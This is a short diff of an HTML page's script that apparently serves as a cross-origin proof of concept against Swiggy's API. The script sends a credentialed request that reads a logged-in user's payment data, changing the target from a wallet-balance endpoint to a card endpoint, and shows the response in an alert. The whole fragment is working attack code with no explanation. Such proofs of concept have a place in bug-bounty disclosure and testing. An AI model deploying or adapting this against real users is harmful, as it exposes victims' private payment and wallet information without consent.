@@ -9,7 +9,7 @@ if (this.readyState == 4 && this.status == 200) {
 document.getElementById("demo").innerHTML = alert(this.responseText);
 }
 };
-xhttp.open("GET", "https://www.swiggy.com/dapi/payment/wallet/check-balance?walletCode=PhoneP", true);
+xhttp.open("GET", "https://www.swiggy.com/dapi/card/pop", true);
 xhttp.withCredentials = true;
 xhttp.send();
 }</script></head>
